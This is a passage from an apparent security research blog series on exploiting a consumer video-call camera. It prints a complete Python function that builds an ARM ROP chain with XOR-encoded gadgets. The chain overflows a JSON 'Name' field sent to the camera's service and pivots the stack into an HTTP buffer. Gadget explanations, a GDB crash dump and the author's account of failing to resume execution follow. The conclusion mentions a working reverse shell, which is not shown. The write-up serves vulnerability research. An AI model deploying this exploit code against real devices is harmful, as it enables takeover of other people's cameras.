b6f57000-b6f58000 rw-s 21100000 00:0a 12         /dev/mem
b6f58000-b6f59000 rw-s 21000000 00:0a 12         /dev/mem
b6f59000-b6f5a000 rw-s 21000000 00:0a 12         /dev/mem
b6f5a000-b6f5b000 rw-s 00000000 00:04 0          /SYSV010b0422 (deleted)
b6f5b000-b6f5d000 rw-p 00000000 00:00 0 
b6f5d000-b6f5e000 r-xp 00000000 00:00 0          [sigpage]
b6f5e000-b6f5f000 r--p 00005000 1f:02 506072     /lib/ld-uClibc-0.9.33.3-git.so
b6f5f000-b6f60000 rw-p 00006000 1f:02 506072     /lib/ld-uClibc-0.9.33.3-git.so
bea9d000-beabe000 rw-p 00000000 00:00 0          [stack]
ffff0000-ffff1000 r-xp 00000000 00:00 0          [vectors]
```

## ROP-Chain

### Stack Pivot

Cool, so now we have the **maps** file, we can start looking for gadgets! For the sake of this blog, I will just dump the full ROP-chain, and highlight any interesting gadgets I used.

```
-python
def send_stack_pivot(sock, session_id, seq_number, libc_base_address, libcpp_base_address):
    """
    Sends a system info request message with type 0x3fc
    """

    libc_base_addr_int = int(libc_base_address, 16)
    libcpp_base_addr_int = int(libcpp_base_address, 16)
    xor_key = 0xffffffff
    sofia_gadget_xor = (0x3f43a8 - 0x34) ^ xor_key # subtract because gagdet adds to it later
    http_buffer_ptr_xor = 0x8f1cfc ^ xor_key

    context.arch = 'arm'
    context.bits = 32
    context.endian = 'little'

    rop_chain = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1"

    rop_chain += p32(0x41414141) # r4
    rop_chain += p32(libcpp_base_addr_int + 0x8d62c) # r5 - gets put into lr for later gadget
    rop_chain += p32(libcpp_base_addr_int + 0x4b970) # r6 - for later gadget
    rop_chain += p32(libc_base_addr_int + 0x4d1a0) # pc

    # libc: 0005d1a0 cpy r1, r5; ldmia sp!,{r3,r4,r5,pc}
    rop_chain += p32(libc_base_addr_int + 0x63710) # r3 - needs to be valid writeable mem addr
    rop_chain += p32(0x41414141) # r4
    rop_chain += p32(xor_key) # r5 - goes into r1 as the XOR key
    rop_chain += p32(libc_base_addr_int + 0x515c0) # pc

    # libc: 000615c0 cpy lr,r1 ; str r1,[r3,#0x0] ; str r2,[r3,#0x4] ; ldmia sp!,{r4,pc}
    rop_chain += p32(0x41414141) # r4
    rop_chain += p32(libc_base_addr_int + 0x4d1a0) # pc

    # libc: 0005d1a0 cpy r1, r5; ldmia sp!,{r3,r4,r5,pc}
    rop_chain += p32(sofia_gadget_xor) # r3 - XOR of the Sofia gadget address
    rop_chain += p32(0x41414141) # r4 - needs to be a valid memory address
    rop_chain += p32(libc_base_addr_int + 0x22104) # r5 - gadget address for after second decode
    rop_chain += p32(libc_base_addr_int + 0x4ca14) # pc

    # libc: 0005ca14 eor r3,r3,r1 ; subs r0,r2,r0 ; sbc r1,r3,r1 ; bx lr
    # now we have decoded sofia gadget in r3

    # first populate lr for the return after the eor gadget
    # libcpp: 0009d62c cpy r2,r5 ; blx r6

    # libcpp: 0005b970 cpy lr,r2 ; moveq r0,#0x6 ; movne r0,#0x1 ; ldmia sp!,{r4,r5,pc}
    rop_chain += p32(libc_base_addr_int + 0x63710) # r4 - needs to be a writeable memory address
    rop_chain += p32(0x41414141) # r5
    rop_chain += p32(libcpp_base_addr_int + 0x5e3b0) # pc

    # move sofia gadget into r2 to keep it safe (libstdc++.so gadget btw (make sure r4 writeable memory address))
    # libcpp: 0006e3b0 add r2,r3,#0x34 ; add r3,r3,#0x20 ; str r2,[r4,#0xc] ; 
    #       str r3,[r4,#0x8] ; add sp,sp,#0x8 ; ldmia sp!,{r4,r5,r6,r7,r8,pc}
    rop_chain += p32(0x42424242) # padding
    rop_chain += p32(0x42424242) # padding
    rop_chain += p32(0x41414141) # r4
    rop_chain += p32(xor_key) # r5 - goes into r1 as the xor key
    rop_chain += p32(libc_base_addr_int + 0x17604) # r6 - for a later gadget
    rop_chain += p32(0x41414141) # r7
    rop_chain += p32(0xfffffffc) # r8 - second part of http buffer address (basically a -4 due to overflow)
    rop_chain += p32(libc_base_addr_int + 0x4d564) # pc

    # now put the key back into the correct place (r4), put encoded buffer address into r3, r6 set earlier on (libstdc++.so
    # libc : 0005d564 cpy r1,r5 ; ldmia sp!,{r3,r4,r5,pc}
    rop_chain += p32(http_buffer_ptr_xor) # r3 - to be xor'ed
    rop_chain += p32(0x41414141) # r4
    rop_chain += p32(0x41414141) # r5
    rop_chain += p32(libc_base_addr_int + 0x4ca14) # pc

    # libc: 0005ca14 eor r3,r3,r1 ; subs r0,r2,r0 ; sbc r1,r3,r1 ; bx lr
    # now we have decoded http buffer address in r3 and decoded sofia gadget address in r2

    # libc: 00032104 ldr r1,[r3,#0x0] ; blx r6
    # now the actual address of the http buffer is in r1, and the sofia gadget is in r2

    # libc: 00027604 cpy r0,r1; ldmia sp!,{r4,r5,pc}
    rop_chain += p32(0x41414141) # r4
    rop_chain += p32(0x41414141) # r5
    rop_chain += p32(libc_base_addr_int + 0x3cc50) # pc

    # libc: 0004cc50 add r0,r0,#0x20 ; ldmia sp!,{r4,pc}
    rop_chain += p32(0x41414141) # r4
    rop_chain += p32(libc_base_addr_int + 0x16cd8) # pc

    # libc: 00026cd8 ldmia sp!,{r3,pc}
    # get control of r3 back
    rop_chain += p32(libc_base_addr_int + 0x50d08) # r3 - for later gadget
    rop_chain += p32(libc_base_addr_int + 0x3e8d4) # pc

    # libc: 0004e8d4 blx r2

    # sofia: 003f43a8 add r11,r0,r8 ; cpy r0,r6 ; blx r3 <- sofia gadget

    # libc: 00060d08 sub sp,r11,#0x4 ; ldmia sp!,{r11,pc} <- stack pivot completed

    rop_chain += b"."    # need the dot for the overflow

    # Create the payload directly in bytes
    payload = b'{"SessionID":"0x%08x","Name":"' % session_id
    payload += rop_chain
    payload += b'"}'

    msg_type = 0x43a
    packet = build_packet(msg_type, seq_number, payload)
    
    try:
        response = send_msg_and_get_response(sock, msg_type, packet)

        header_info, payload, session_id = parse_response(response)

        return seq_number, payload
    except Exception as e:
        return None
```

So, the first issue I came across was a complete lack of gadgets for getting control of the stack pointer in the shared objects. The only gadget I could find was in Sofia, which got control of **r11**:

```
003f43a8 add r11,r0,r8 ; cpy r0,r6 ; blx r3 
```

It was then quite simple to set the **sp** which a pretty common gadget:

```
libc: 00060d08 sub sp,r11,#0x4 ; ldmia sp!,{r11,pc}
```

However, as I could not include null terminators (and the fact that any Sofia gadget will have one), I needed to somehow work around this. I ended up finding a pretty decent XOR gadget in libc which was immensely helpful:

```
libc: 0005ca14 eor r3,r3,r1 ; subs r0,r2,r0 ; sbc r1,r3,r1 ; bx lr
```

It was a bit of a pain to use due to the **bx lr** at the end, but it worked well for decoding both the HTTP buffer address pointer (which we are pivoting to), and the Sofia gadget for performing the pivot. 

A few painful gadgets later, I successfully pivotted to the HTTP buffer which I could pre-fill with a larger ROP-chain (that can also include zero's!). The string of **F**'s is the contents of the HTTP buffer:

![stack_pivot.png](/assets/images/video_call_camera_p7/stack_pivot.png)

### Its Not All Sunshine and Rainbows

Now that we can execute a less-constrained ROP-chain, we should start to focus on fixing up!

I spent about three days trying to get this to work to no success, I tried EVERYTHING:
- Tried fixing up every register I possibly could (everything minus **r1**, **r3** and **r11**)
- Tried different points to regain execution
- Tried three different stack overflows - similar crash for all of them
- Loaded GDB about 4 million times
- Analysed the stack frames to ensure I'm not clobbering anything important

Every time I got the stack pointer correct, it would throw out a crash very similar to this:

```
$r0  : 0xb6e12418  →   cmp r0,  #0
$r1  : 0xb6e12418  →   cmp r0,  #0
$r2  : 0xc39264c0
$r3  : 0xe3500000
$r4  : 0xb2dff854  →  0xb6e12418  →   cmp r0,  #0
$r5  : 0x1       
$r6  : 0x1       
$r7  : 0x02850e28  →  0x0284aec8  →  0x0284ba38  →  0x00000000
$r8  : 0xb2dff86c  →  0x00000000
$r9  : 0x0       
$r10 : 0x73776f64 ("dows"?)
$r11 : 0xb6e123c8  →  <obstack_free+0078> str r1,  [r4,  #4]
$r12 : 0xb6fe4ecc  →  0xc39264c0
$sp  : 0xb2dff840  →  0x000005a8
$lr  : 0x00025298  →   mov r0,  r4
$pc  : 0x0001f658  →   ldr r0,  [r3]
$cpsr: [NEGATIVE zero carry overflow interrupt fast thumb]
```

The cause of the crash is it trying to dereference the contents of **r3**, which it is somehow getting from **r4** which is pointing to a pointer which points to that data. I traced it down to a function that is locking a mutex, and the mutex is no longer valid which causes a crash. It seems like it occurs when the session is being released, but I have absolutely no clue how this is being impacted by the overflow - very frustrating!

![stupid_computer.gif](/assets/images/video_call_camera_p7/stupid_computer.gif)

If I overflow only **r4-6** and **pc** to the same point I try to resume execution, there is no crash, but when I try to pivot the stack back - crash. I've even made sure there is enough room on the stack frame and I am not overwriting anything important. 

I think we will need a different approach! At least I have the working stack pivot...

![sunk_cost.jpg](/assets/images/video_call_camera_p7/sunk_cost.jpg)

I think I have sunk enough time into this exploit for now (especially considering I already have a working exploit for the other one). But we've got to the point where we have arbitrary code execution via ROP in the HTTP buffer, so I'll come back to it in the future and finish it off!

# Conclusion

In this blog, we got our hands on another camera that uses the same App, and despite it being quite different under the hood, most of our bugs impact both cameras (and we even found a couple of new ones!). We used a slightly different method in the same handler to get our trusty reverse shell binary working, and we can also debug it with GDB. We also tried (and failed) to exploit a stack overflow that is no longer mitigated by canaries, but I'll definitely come back to it!

